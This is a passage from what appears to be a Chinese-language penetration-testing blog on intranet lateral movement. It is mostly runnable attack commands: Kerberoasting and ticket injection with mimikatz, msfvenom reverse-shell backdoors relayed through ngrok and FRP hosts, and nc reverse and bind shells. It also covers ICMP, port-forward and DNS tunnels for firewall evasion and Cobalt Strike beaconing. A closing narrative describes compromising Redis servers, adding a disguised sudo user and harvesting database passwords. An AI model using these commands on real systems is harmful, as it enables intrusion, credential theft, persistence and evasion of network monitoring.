class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span>  <span class="string">&quot;服务名&quot;</span></span><br><span class="line"><span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span>  <span class="string">&quot;MSSQLSvc/SqlServer.god.org:1433&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mimikatz请求（与owershell请求，二者选其一即可）</span></span><br><span class="line">mimikatz.exe  <span class="string">&quot;kerberos::ask /target:xxxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看票据</span></span><br><span class="line">klist</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/68747470733a2f2f7479706f72612d313331303537393732362e636f732e61702d7368616e676861692e6d7971636c6f75642e636f6d2f696d616765732f36392d372e706e67.png" alt="img" /></p><h3 id="导出票据"><a class="markdownIt-Anchor" href="#导出票据"></a> 导出票据</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mimikatz</span></span><br><span class="line">.\mimikatz.exe  </span><br><span class="line">kerberos::list /export</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230703100204846.png" alt="image-20230703100204846" /></p><h3 id="破解票据"><a class="markdownIt-Anchor" href="#破解票据"></a> 破解票据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 破解工具tgsrepcrack.py python3环境运行</span></span><br><span class="line">python tgsrepcrack.py  passwd.txt xxxx.kirbi</span><br><span class="line">python3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi</span><br></pre></td></tr></table></figure><h3 id="重写票据"><a class="markdownIt-Anchor" href="#重写票据"></a> 重写票据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500</span><br><span class="line">python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512</span><br><span class="line"><span class="comment"># 将生成的票据注入内存</span></span><br><span class="line">mimikatz.exe kerberos::ptt xxxx.kirbi  </span><br></pre></td></tr></table></figure><h3 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> //xxx.xxx.xxx.xxx /c$</span><br></pre></td></tr></table></figure><h2 id="cobalt-strike"><a class="markdownIt-Anchor" href="#cobalt-strike"></a> Cobalt Strike</h2><p>具体看手册，还是得多用，这个必问</p><h1 id="域横向代理与隧道"><a class="markdownIt-Anchor" href="#域横向代理与隧道"></a> 域横向【代理与隧道】</h1><h2 id="内网与外网"><a class="markdownIt-Anchor" href="#内网与外网"></a> 内网与外网</h2><p>内网网段：</p><ol><li>10.0.0.0/8 10.255.255.255/8</li><li>172.16.0.0/12 172.31.255.255/12</li><li>192.168.0.0/16 192.168.255.255/16</li></ol><p>后面那个是子网掩码，A类是8，B类是12，C类是16。即递增为4</p><p>不同网段（子网不同）之间是不可能进行通信的，需要通过转发才能实现，这个转发可以是路由器进行转发。说到底路由器（网关）也是一个设备，这个设备布置了流量转发的功能。</p><h2 id="正向连接与反向连接"><a class="markdownIt-Anchor" href="#正向连接与反向连接"></a> 正向连接与反向连接</h2><p><strong>正向连接</strong></p><p>即：攻击者去连接受害者，此时：攻击者处于<strong>内网</strong>，受害者处于<strong>外网</strong></p><p><strong>反向连接</strong></p><p>即：受害者去连接攻击者，此时：攻击者处于<strong>外网</strong>，受害者处于<strong>内网</strong></p><p>也就是谁在外网，就让内网的去连他，因为外网不能直接连上内网，更因为，内网的地址可能是动态分配的，所以会改变。</p><h2 id="代理与隧道技术"><a class="markdownIt-Anchor" href="#代理与隧道技术"></a> 代理与隧道技术</h2><ul><li>代理主要解决网络的连通性问题，还可以解决<ul><li>内网有过滤</li><li>内网无法连接外网的问题</li></ul></li><li>隧道主要解决流量分析工具、流量监控工具、防火墙等相关工具的过滤问题</li></ul><h2 id="代理"><a class="markdownIt-Anchor" href="#代理"></a> 代理</h2><h3 id="ngrok"><a class="markdownIt-Anchor" href="#ngrok"></a> Ngrok</h3><p><a href="https://ngrok.com/">https://ngrok.com/</a></p><p><a href="https://www.ngrok.cc/">https://www.ngrok.cc/</a></p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/68747470733a2f2f7479706f72612d313331303537393732362e636f732e61702d7368616e676861692e6d7971636c6f75642e636f6d2f696d616765732f37302d312e706e67.png" alt="img" /></p><p>先注册一个账号，然后选择一个免费的服务器（现在要付费认证，认证还要付费，绝了，不用了，拜拜），选择http流量转发，假设本地端口192.168.80.137:4444，即内网Kali，内网的win7执行后门后，经过服务器转发到我们的Kali。</p><p>启动Ngrok：<code>./sunny clientid 隧道号</code></p><p>然后在本机生成一个http木马（流量端口为80)传入到受害主机并且触发，注意，改木马的地址为我们服务器的地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_http lhost=xiaodisec.free.idcfengye.com lport=80 -f exe -o test.exe</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.80.137</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>然后kali开启监听即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.80.137</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h3 id="frp同样可以配合proxychain"><a class="markdownIt-Anchor" href="#frp同样可以配合proxychain"></a> FRP（同样可以配合proxychain）</h3><ul><li>FRP说明文档：<a href="https://gofrp.org/docs/examples/">https://gofrp.org/docs/examples/</a></li><li><a href="https://github.com/fatedier/frp/releases/tag/v0.42.0">Release v0.42.0 · fatedier/frp (github.com)</a></li><li>参考：<a href="https://www.anquanke.com/post/id/184855">https://www.anquanke.com/post/id/184855</a></li><li>Frp工具：开源免费，自行搭建，方便修改，成本低，使用多样化，防止隐私泄露。</li></ul><h4 id="服务端设置"><a class="markdownIt-Anchor" href="#服务端设置"></a> 服务端设置</h4><p>服务器修改配置文件 frps.ini：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><p>启动服务端：<code>./frps -c ./frps.ini</code></p><h4 id="控制端设置"><a class="markdownIt-Anchor" href="#控制端设置"></a> 控制端设置</h4><p>配置文件 frpc.ini：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 你的云主机 ip</span><br><span class="line">server_port = 7000 #frpc 工作端口，必须和上面 frps 保持一致</span><br><span class="line">[msf]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 5555 #转发给本机的 5555</span><br><span class="line">remote_port = 6000 #服务端用 6000 端口转发给本机</span><br></pre></td></tr></table></figure><p>启动客户端：<code>./frpc -c ./frpc.ini</code></p><h4 id="后门生成-运行-反弹接受"><a class="markdownIt-Anchor" href="#后门生成-运行-反弹接受"></a> 后门生成、运行、反弹接受</h4><p>与上面的方法一样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=你的云主机ip lport=6000 -f exe -o frp.exe</span><br></pre></td></tr></table></figure><p>然后配置监听即可</p><h4 id="自己搭建的外网代理"><a class="markdownIt-Anchor" href="#自己搭建的外网代理"></a> 自己搭建的外网代理</h4><p>在外网主机上传一个frps，而自己这里搭建一个frpc，这样所有特定流量都会转发到frps上，frpc设置的是127.0.0.1，设置端口，就OK了</p><h3 id="三层穿透proxychainsocks4a路由"><a class="markdownIt-Anchor" href="#三层穿透proxychainsocks4a路由"></a> 三层穿透——ProxyChain+Socks4a+路由</h3><h4 id="拓扑图"><a class="markdownIt-Anchor" href="#拓扑图"></a> 拓扑图</h4><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/68747470733a2f2f7479706f72612d313331303537393732362e636f732e61702d7368616e676861692e6d7971636c6f75642e636f6d2f696d616765732f37302d322e706e67.png" alt="70-2" /></p><p>我们的目标很明确，就是获取三个flag，分别在target1/2/3中。</p><p>参考：</p><ul><li><a href="https://www.cnblogs.com/zhengna/p/15348419.html">https://www.cnblogs.com/zhengna/p/15348419.html</a></li><li><a href="https://blog.csdn.net/qq_42383069/article/details/123576958">https://blog.csdn.net/qq_42383069/article/details/123576958</a></li><li><a href="https://hackergu.com/cfs-network/">https://hackergu.com/cfs-network/</a></li><li>CFS三层靶机环境： 链接: <a href="https://pan.baidu.com/s/1LJueA-X02K7HZXr8QsOmeg">https://pan.baidu.com/s/1LJueA-X02K7HZXr8QsOmeg</a> 提取码: dkcp 解压密码：<a href="http://teamssix.com">teamssix.com</a></li></ul><h4 id="攻击路线"><a class="markdownIt-Anchor" href="#攻击路线"></a> 攻击路线</h4><ol><li><p>攻击最外层，获得shell（thinkphp rce+一句话木马）</p><ol><li><p>经过各种方式获得shell之后需要进行信息搜集以及路由设置，但是我们首先是不知道有内网而且是什么网段的。</p><ol><li><p>后门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=3333 -f elf &gt; t2.elf</span><br></pre></td></tr></table></figure></li><li><p>接受：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.22.128</span><br><span class="line">set LPORT 3333</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li></ol></li><li><p>进行网卡的扫描，并添加路由，可以使用ifconfig或者在meterpreter上使用：</p><ol><li><p>获取网络接口：<code>run get_local_subnets</code></p></li><li><p>查看路由地址：<code>run autoroute -p</code></p></li><li><p>如果没有对应内网的那个路由，那就添加：<code>run autoroute -s 192.168.22.0/24</code>。</p><p>这里添加完后，就相当于以我们能在外网访问到的网址作为网关，进行转发流量，到我们的kali上的Msf。但是这样只能在msf上使用，所以需要在本机kali上开一个端口，作为代理，转发流量到我们的端口上，这时候需要ProxyChain+Socks4a配合</p></li></ol></li><li><p>ProxyChain+Socks4a配合完成代理【注：如果攻击机是windows的话，还可以利用代理工具Proxifier或SocksCap64载入代理进行远程访问测试。】</p><ol><li><p>开启本机代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set version 4a</span><br><span class="line">set srvport 2222</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>配置proxychains：找到proxychains.conf文件，linux是/etc/proxychains.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line">socks4 192.168.80.137 2222</span><br></pre></td></tr></table></figure></li><li><p>运行proxychains，用nmap扫描（注意这个socks转发http/tcp协议的流量）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -Pn 192.168.22.0/24</span><br><span class="line">proxychains4 nmap -sT -Pn 192.168.22.0/24 -p80 //这里是为了快速扫描</span><br><span class="line">-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。</span><br><span class="line">-sT：扫描TCP数据包已建立的连接connect</span><br></pre></td></tr></table></figure><p>我们访问内网服务的时候，浏览器设置代理：</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230704220840773.png" alt="image-20230704220840773" /></p></li></ol></li></ol></li><li><p>当我们上传了木马到第二台主机，那么我们去用蚁剑连接的时候需要设置代理：</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230704221716634.png" alt="image-20230704221716634" /></p></li><li><p>当我们拿到第二台主机，对第三台主机进攻，我们很多漏洞扫描工具又可以派上用场，例如：namp --script=all、namp --script=vuln、nessus，设置代理即可。</p></li><li><p>步骤差不多~over，自己试验。</p></li></ol><h3 id="nps更强大的web代理"><a class="markdownIt-Anchor" href="#nps更强大的web代理"></a> NPS（更强大的web代理）</h3><p><a href="https://teamssix.com/210612-213704.html">https://teamssix.com/210612-213704.html</a></p><p>下载：<a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p><h2 id="隧道"><a class="markdownIt-Anchor" href="#隧道"></a> 隧道</h2><p>主要解决：</p><ul><li>防火墙过滤问题、网络连接通信问题、数据回链封装问题</li><li>在数据通信被拦截的情况下，可以利用隧道技术封装改变通信协议进行绕过拦截。比如CS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等问题，都可以通过隧道技术解决。</li></ul><p>需要特别注意的是：</p><ul><li>在用隧道之前要先探测对应隧道协议是否支持，如果不支持，用这个隧道也没有任何意义！</li></ul><p>它与代理的区别：</p><ul><li>代理通过转发tcp包出去，但是防火墙会对这些包进行拦截，我们可以伪装这些tcp包为icmp包【封装】再转发出去，这样就可以躲过监控。</li></ul><h3 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h3><ul><li>隧道，就是一种绕过端口屏蔽的通信方式。</li><li>防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。</li></ul><h3 id="常用的隧道技术"><a class="markdownIt-Anchor" href="#常用的隧道技术"></a> 常用的隧道技术</h3><ul><li>网络层：IPv6隧道、ICMP隧道、GRE隧道</li><li>传输层：TCP隧道、UDP隧道、常规端口转发</li><li>应用层：SSH隧道、HTTP隧道、HTTS隧道、DNS隧道</li></ul><p>涉及到OSI七层与TCP/IP 五层或者四层协议</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/68747470733a2f2f7479706f72612d313331303537393732362e636f732e61702d7368616e676861692e6d7971636c6f75642e636f6d2f696d616765732f37312e706e67.png" alt="img" /></p><h3 id="探测使用隧道类型"><a class="markdownIt-Anchor" href="#探测使用隧道类型"></a> 探测使用隧道类型</h3><p>隧道有各种层面的，每个层面又分不同协议，你想要用哪个隧道，就需要先确定目标主机是否支持对应隧道协议。</p><p>可以使用以下协议进行判断。</p><ul><li>ICMP协议：ping：<code>ping www.baidu.com</code></li><li>TCP协议：telnet\nc：<code>telnet  www.baidu.com  80</code>,<code>nc -zv www.baidu.com 80 </code>【z为扫描不发送数据包，v表示详细输出】</li><li>HTTP协议：curl\wget：<code>curl www.baidu.com 80</code>,<code>wget -S www.baidu.com</code></li><li>DNS协议：nslookup\dig：<code>nslookup www.baidu.com</code>,<code>dig www.baidu.com</code>【这两个分别是win和linux自带的】</li></ul><h3 id="网络层-icmp-隧道-ptunnelpingtunnel-使用"><a class="markdownIt-Anchor" href="#网络层-icmp-隧道-ptunnelpingtunnel-使用"></a> 网络层 ICMP 隧道 <a href="https://github.com/f1vefour/ptunnel">ptunnel</a>/<a href="https://github.com/esrrhs/pingtunnel">Pingtunnel</a> 使用</h3><p>pingtunnel是把tcp/udp/sock5流量伪装成icmp流量进行转发的工具 为什么要转换？因为tcp、udp、sock5这几个协议受到防火墙和工具的拦截，这个工具就是把这些流量伪装成icmp进行数据传输！</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-p ##表示连接icmp隧道另一端的机器IP（即目标服务器）</span><br><span class="line">-lp##表示需要监听的本地tcp端口</span><br><span class="line">-da ##指定需要转发的机器的IP（即目标内网某一机器的内网IP）</span><br><span class="line">-dp ##指定需要转发的机器的端口（即目标内网某一机器的内网端口）</span><br><span class="line">-x##设置连接的密码</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># target2执行</span><br><span class="line">./ptunnel -x xiaodi </span><br><span class="line"></span><br><span class="line"># kali执行</span><br><span class="line">./ptunnel -p 192.168.80.145 -lp 1080 -da 192.168.33.33 -dpd 3389 -x xiaodi # 转发的3389请求数据给本地1080。相当于端口映射，将3389端口映射到1080端口并通过icmp封装，后面只要访问1080就是访问3389</span><br><span class="line">rdesktop 127.0.0.1 1080</span><br></pre></td></tr></table></figure><p>实验准备：<a href="https://blog.csdn.net/markecheng/article/details/110352161">https://blog.csdn.net/markecheng/article/details/110352161</a></p><h3 id="传输层隧道-lcxwinportmaplinux-使用"><a class="markdownIt-Anchor" href="#传输层隧道-lcxwinportmaplinux-使用"></a> 传输层隧道 <a href="https://github.com/MrAnonymous-1/lcx">lcx[win]</a>/portmap[linux] 使用</h3><p>lcx是一个端口转发工具，通过端口转发的形式，将内网服务器的某一个端口映射到公网另一台服务器的一个端口上去</p><p>例如在<strong>内网主机</strong>中使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lcx.exe -slave 192.168.3.31 6666 127.0.0.1 3389 //将本地3389给webserver的6666</span><br></pre></td></tr></table></figure><p>这样，外网主机就可以通过自己的6666端口访问3389了。<strong>外网webserver</strong>监听并转发：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lcx.exe -listen 6666 7777   // 监听6666转发至7777</span><br></pre></td></tr></table></figure><p>在<strong>内网kali</strong>上执行以下命令，连接webserver的7777，登录远程桌面访问，这里其实登录的是域控DC的远程桌面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.80.146:7777</span><br></pre></td></tr></table></figure><h3 id="传输层隧道转发nc流量"><a class="markdownIt-Anchor" href="#传输层隧道转发nc流量"></a> 传输层隧道——转发nc流量</h3><h4 id="正向shell连接受害者"><a class="markdownIt-Anchor" href="#正向shell连接受害者"></a> 正向shell（连接受害者）</h4><p>受害者执行（监听，听到谁，就给shell）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -ldp 1234 -e /bin/sh #linux</span><br><span class="line">nc -ldp 1234 -e c:\windows\system32\cmd.exe  #windows</span><br></pre></td></tr></table></figure><p>攻击，我主动连接：<code>nc 192.168.76.132 1234</code></p><h4 id="反弹shell受害者连我"><a class="markdownIt-Anchor" href="#反弹shell受害者连我"></a> 反弹shell（受害者连我）</h4><p>攻击，受害者连我</p><p>我监听：<code>nc -lvp 1234</code></p><p>受害者执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.3.32 1234 -e /bin/sh</span><br><span class="line">nc 192.168.3.32 1234 -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure><h4 id="多向连接反弹-shell-配合转发"><a class="markdownIt-Anchor" href="#多向连接反弹-shell-配合转发"></a> 多向连接反弹 shell-配合转发</h4><p>假设有三个主机，webserver连外网，内网有一台pc，kali在外网</p><p>我们通过上面的方法将端口转发：</p><p>pc：<code>nc 192.168.3.31 2222 -e c:\windows\system32\cmd.exe</code></p><p>webserver：<code>Lcx.exe -listen 2222 3333</code></p><p>kali：<code>nc -v 192.168.80.146 3333</code></p><p>kali能够和webserver联通，可以直接接收3333的shell，间接的取得了sqlserver的权限</p><h4 id="其他功能"><a class="markdownIt-Anchor" href="#其他功能"></a> 其他功能</h4><p>指纹服务：<code>nc -nv 192.168.76.143</code></p><p>端口扫描：<code>nc -v -z 192.168.76.143 1-100</code></p><p>端口监听：<code>nc -lvp xxxx</code></p><p>文件传输：<code>nc -lp 1111 &gt;1.txt|nc -vn xx.xx.x.x 1111 &lt;1.txt -q 1</code></p><h3 id="应用层dns隧道配合cs上线"><a class="markdownIt-Anchor" href="#应用层dns隧道配合cs上线"></a> 应用层DNS隧道——配合CS上线</h3><h4 id="原理-2"><a class="markdownIt-Anchor" href="#原理-2"></a> 原理</h4><p>核心思想：<strong>端口不和服务绑定，可以传输任何数据</strong>。</p><p>正常网络之间的通信，是发生在两台机器建立TCP连接之后的，在进行通信时：如果目标是IP，则会直接发送报文，如果是域名，则将域名解析为IP再通信。C&amp;C服务器在建立连接后将指令传递给客户端上的后门程序。</p><p>DNS隧道的原理就是：在后门程序进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，<strong>就会访问互联网进行查询</strong>，然后返回结果，如果互联网上有一台攻击者设置的服务器，那么服务器就可以依靠域名解析的响应进行数据包的交换，从DNS协议的角度来看，这样的操作只是反复查询某个或者某些特定的域名并且得到解析结果，<strong>但其本质是，DNS预期的返回结果应该是一个IP地址，而事实上不是——返回的可以是任意字符串，包括加密的C&amp;C指令，从而将其他协议封装在DNS协议中进行传输</strong>。</p><p>参考：</p><ul><li><a href="https://www.cnblogs.com/HighnessDragonfly/p/14631308.html">dns隧道攻击原理及常用工具流量分析</a></li></ul><h4 id="操作-2"><a class="markdownIt-Anchor" href="#操作-2"></a> 操作</h4><p>当常见协议监听器被拦截时，可以换其他协议上线，其中dns协议上线基本通杀</p><p>CS上有DNS Beacon，可以使用它完成隧道。有Teamserver，部署在云端，这时候：</p><ol><li><p>Teamserver就需要启用53端口UDP</p></li><li><p>买一个域名，修改解析记录如下：</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230704234352966.png" alt="image-20230704234352966" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A记录-&gt;cs主机名-&gt;CS服务器IP</span><br><span class="line">NS记录-&gt;ns1主机名-&gt;上个A记录地址</span><br><span class="line">NS记录-&gt;ns2主机名-&gt;上个A记录地址</span><br></pre></td></tr></table></figure></li><li><p>配置DNS监听内容：<code>ns1.xiaodi8.com、ns2.xiaodi8.com——&gt;cs.xiaodi8.com</code></p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230704234319405.png" alt="image-20230704234319405" /></p></li><li><p>生成后门，执行上线后启用命令：<code>attacks--&gt;packages--&gt;windows executable(s)--&gt;listener</code></p><p>选择dns上线，勾选–&gt;选择后门生成位置–&gt;生成后门。将后门上传到webserver，执行。执行后门后，cs出现一个黑窗口。</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230704234142908.png" alt="image-20230704234142908" /></p><p>点击小图标，出现unknown主机，原因是我们使用DNS上线，DNS速度特别慢。此时我们需要再敲几条命令才能实现控制。点击unknown主机，输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">checkin</span><br><span class="line">mode dns-txt</span><br><span class="line">shell whoami</span><br></pre></td></tr></table></figure></li></ol><h1 id="cs与msf联动"><a class="markdownIt-Anchor" href="#cs与msf联动"></a> CS与MSF联动</h1><h2 id="cs到msf"><a class="markdownIt-Anchor" href="#cs到msf"></a> CS到MSF</h2><ul><li><p>CS创建监听listen</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230705095001864.png" alt="image-20230705095001864" /></p></li><li><p>CS产生木马，运行之后在CS上线</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230705095023212.png" alt="image-20230705095023212" /></p></li><li><p>CS添加一个新的监听器，用来传递给msf。由于生成的木马就是HTTP的，所以委派给msf时，监听器还是HTTP的。</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230705095105503.png" alt="image-20230705095105503" /></p></li><li><p>CS委派对话</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230705095208450.png" alt="image-20230705095208450" /></p></li><li><p>MSF准备接受</p><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/image-20230705095150443.png" alt="image-20230705095150443" /></p></li></ul><h2 id="msf到cs"><a class="markdownIt-Anchor" href="#msf到cs"></a> MSF到CS</h2><p>msf在拿到session之后，使用<code>exploit/windows/local/payload_inject</code>模块来指明接收者的 ip 和端口，然后把session委派出去。</p><ol><li>MSF选择session，使用模块：<code>use exploit/windows/local/payload_inject</code>，并设置相关payload信息。主要是端口，run即可<ul><li>lport写的是cs监听端口</li><li>lhost写的是cs主机ip</li></ul></li><li>CS使用监听器，监听一个端口，8即可</li></ol><h1 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h1><p>内网横向肯定得 fscan 出场了，一般刚开始就扫个 C 段就行了，好巧不巧，发现了我最喜欢的 Redis 未授权，进去发现还是 root 用户，但是不出网。</p><p>这种情况我一般会创建一个 sudo 免密的新用户，就 adduser 然后 visudo 就可以了，用户名字起地别太假。</p><p>然后在出网的机器用 nps 搭一个隧道出来，服务端提前配好，客户端就三句话的事</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com//ehang-io/nps/releases/download/v0.26.10/linux_amd64_client.tar.gz</span><br><span class="line">tar -zxvf linux_amd64_client.tar.gz</span><br><span class="line">nohup ./npc -server=xxx.xxx.xxx.xxx:xxx -vkey=xxx &gt; npc.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><p>然后继续内网扫描，首先用扫描器的 icmp 模块看看内网有多大，然后再扫。</p><p>内网不大，就两个 C 段资产比较多。</p><p>我一般习惯先拿非 web 资产，最后再看 web 资产。</p><p>首先把所有的 redis 未授权和弱口令都利用了，一共拿到大约 12 台机器，然后进去翻 web 服务的配置文件，把数据库密码找到，发现几个经常用的强口令，补充到扫描器里接着爆扫数据库和服务器。</p><p>涉及到的服务器与内容：</p><ol><li><p>OA系统</p></li><li><p>WEB服务：nacos的服务</p></li><li><p>生产系统：Solr，elasticsearch，Flink，Sentinel</p></li><li><p>LDAP 服务的管理端，管控着 jira、jenkins 等服务</p></li></ol><h1 id="资源下载"><a class="markdownIt-Anchor" href="#资源下载"></a> 资源下载</h1><ul><li><p>K8Tools，K8哥哥的工具库：<a href="https://github.com/k8gege/K8tools">https://github.com/k8gege/K8tools</a></p></li><li><p><a href="https://github.com/gentilkiwi/kekeo/">https://github.com/gentilkiwi/kekeo/</a></p></li><li><p><a href="https://github.com/k8gege/Ladon/releases">k8gege/Ladon: 大型内网渗透扫描器</a></p><p>解压密码：<a href="http://k8gege.org">k8gege.org</a></p></li><li><p><a href="https://github.com/ianxtianxt/MS14-068/blob/master/MS14-068.exe">https://github.com/ianxtianxt/MS14-068/blob/master/MS14-068.exe</a></p></li><li><p>暗月免杀mimikatz 链接：<a href="https://pan.baidu.com/s/1erHWNWQ6roVWTKNkdWsffg?pwd=uy5q">https://pan.baidu.com/s/1erHWNWQ6roVWTKNkdWsffg?pwd=uy5q</a> 提取码：uy5q</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概念&quot;&gt;&lt;/a&gt; 概念&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%9</summary>
      
    
    
    
